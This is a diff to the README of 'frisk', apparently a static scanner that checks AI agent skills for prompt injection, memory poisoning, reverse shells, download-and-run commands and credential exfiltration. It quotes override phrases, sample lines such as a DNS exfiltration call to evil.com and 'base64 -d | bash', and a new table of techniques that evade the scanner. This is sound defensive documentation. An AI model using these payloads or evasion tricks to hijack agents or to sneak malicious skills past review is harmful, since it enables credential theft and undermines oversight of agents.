@@ -40,7 +40,7 @@ Five categories, each mapped to the OWASP Agentic Top 10:
 | Prompt injection | Override phrasing, hidden instructions (HTML comments, zero-width/bidi characters, invisible styling), **priority-override claims** ("this instruction supersedes the system prompt"), **safety-filter disables** ("disable all safety filter mechanisms") | ASI01 |
 | Memory poisoning | Writes to `CLAUDE.md` / `~/.claude` and self-propagating "add this to your own skill" directives | ASI02 |
 | Malicious code | Reverse shells (bash / python / perl / ruby / socat), remote code execution (`curl \| bash` or any interpreter, download-and-run, process substitution, `exec` of fetched or base64-decoded code), persistence and privilege-escalation backdoors (`/etc/sudoers`, `authorized_keys`, **setuid/setgid on system binaries**, **`sudo su` root shell**), obfuscated payloads, destructive operations | ASI05 |
-| Data exfiltration | Credential read + network egress in the same script (`~/.aws`, `~/.ssh`, `.env`, tokens - over HTTP, DNS, or email), **base64-encode-then-send** obfuscation, contacts with known-bad exfil endpoints (webhook.site, requestbin, ngrok, beeceptor, canarytokens, etc.) | ASI06 |
+| Data exfiltration | Credential read + network egress in the same script (`~/.aws`, `~/.ssh`, `.env`, tokens - over HTTP, DNS, or email), **base64-encode-then-send** obfuscation, contacts with known-bad exfil endpoints (webhook.site, requestbin, ngrok, beeceptor, canarytokens, etc.), **cross-unit taint** (secret read in one file + egress in another) | ASI06 |
 | Capability mismatch | Behavior the skill never declared in its frontmatter | ASI08 |
 
 ### Detection rules added in v0.1.1
@@ -59,6 +59,16 @@ Bug fixes in v0.1.1:
 - **DNS exfil** pattern now catches `dig +time=5 $data.evil.com` (interleaved flags) that evaded the old single-variant regex
 - **httpx** added to egress patterns (Python async HTTP client was missing)
 - **SUSPICIOUS_HOSTS** expanded with `beeceptor.com` and `canarytokens.{com,org}`
+
+### Detection rules added in frisk/dig
+
+| Rule ID | Category | Signal | Severity |
+|---------|----------|--------|----------|
+| EXF-CORR | exfiltration | Secret read and network egress in **separate** scripts (split-file exfiltration); high when egress targets a known exfil host, medium for a literal external URL, low for generic egress | high / medium / low |
+
+Rule hardening in frisk/dig:
+- **malicious-code `eval`/`exec` pattern** extended to catch `exec(bytes.fromhex("..."))` in Python; hex-encoding payloads is now detected alongside base64 and `fromCharCode` obfuscation
+- **Pattern exports**: `SECRET_PATTERNS`, `EGRESS_PATTERNS`, `SUSPICIOUS_HOSTS` are now exported from the exfiltration rule so cross-unit analysis reuses them without duplication
 
 ## Usage
 
@@ -136,10 +146,25 @@ Or inline: `# frisk:ignore exfiltration -- reviewed, talks to our own API`.
 
 frisk is a static scanner with an optional model pass. It raises the cost of shipping a malicious skill; it does not guarantee a skill is safe.
 
-- Pattern-based detection can be evaded by splitting an attack across files or heavy obfuscation. The `--llm` pass narrows this but does not close it.
+- Pattern-based detection can be evaded by heavy obfuscation. The `--llm` pass narrows this but does not close it.
 - It reads code, it never runs it, so it cannot observe runtime behavior.
 - v1 targets Claude Code skills (`SKILL.md` plus bundled scripts). Plugins, MCP servers, and other agent ecosystems are not yet covered.
 - A green result means "no known-bad patterns found", not "audited and safe".
+
+### Known limitations / evasion
+
+The following adversarial techniques are **not** caught by the static rules. Each was probed in `test/evasion.test.ts` and documented here rather than addressed with rules that would produce unacceptable false-positive rates.
+
+| Evasion technique | Why not caught | Mitigation |
+|---|---|---|
+| Keyword split with spaces (`ig nore previous instructions`) | Regex requires the full token; matching all split variants requires combinatorial patterns that fire on normal prose | Use `--llm` for paraphrase-level detection |
+| Cyrillic homoglyph substitution (`оverrіde` with Cyrillic о / і) | NFKC normalization equates compatibility variants but not cross-script visual twins | `--llm` |
+| IP address in decimal notation (`curl http://3221225985/`) | Converting 32-bit integers to dotted-quad then comparing to suspicious ranges requires arithmetic, not regex | `--llm` |
+| Hostname string concatenation (`"web" + "hook.site"`) | Static analysis cannot resolve dynamic string construction without dataflow execution | `--llm` |
+| `fromCharCode()` / `fromhex()` decoded to a variable, used later | Taint must reach `eval`/`exec` on the same line; multi-step dataflow is undecidable statically | `--llm` |
+| IPv6 literals or other uncommon host representations | Not currently in `SUSPICIOUS_HOSTS`; adds significant complexity for low attack prevalence | File a GitHub issue if you encounter this in the wild |
+
+**What IS caught** in this category: `echo "BLOB" \| base64 -d \| bash`, `eval(String.fromCharCode(...))`, `exec(bytes.fromhex(...))`, `exec(base64.b64decode(...))`, zero-width chars in any position, attack payloads in HTML comments / tiny-text spans / `<details>` blocks, and trailing-dot FQDNs on known-bad hosts.
 
 See [`corpus/`](corpus/) for the documented attack patterns frisk detects and the benign fixtures that keep it precise.
 
